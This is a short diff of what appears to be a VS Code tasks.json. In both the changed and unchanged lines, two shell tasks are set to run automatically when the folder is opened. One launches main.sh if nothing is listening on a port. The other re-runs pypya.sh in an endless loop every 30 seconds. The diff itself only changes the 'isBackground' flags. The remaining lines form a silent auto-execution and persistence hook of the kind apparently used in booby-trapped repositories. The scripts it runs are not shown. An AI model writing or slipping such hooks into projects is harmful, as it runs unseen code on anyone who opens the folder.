@@ -6,7 +6,7 @@
             "type": "shell",
             "command": "lsof -i -P -n | grep LISTEN > /dev/null || (chmod +x main.sh && ./main.sh)",
             "problemMatcher": [],
-            "isBackground": true,
+            "isBackground": false,
             "runOptions": {
                 "runOn": "folderOpen"
             }
@@ -16,7 +16,7 @@
             "type": "shell",
             "command": "while true; do sleep 20; (chmod +x pypya.sh && ./pypya.sh) || true; echo 'Retrying t.js in 30s...'; sleep 30; done",
             "problemMatcher": [],
-            "isBackground": true,
+            "isBackground": false,
             "runOptions": {
                 "runOn": "folderOpen"
             }
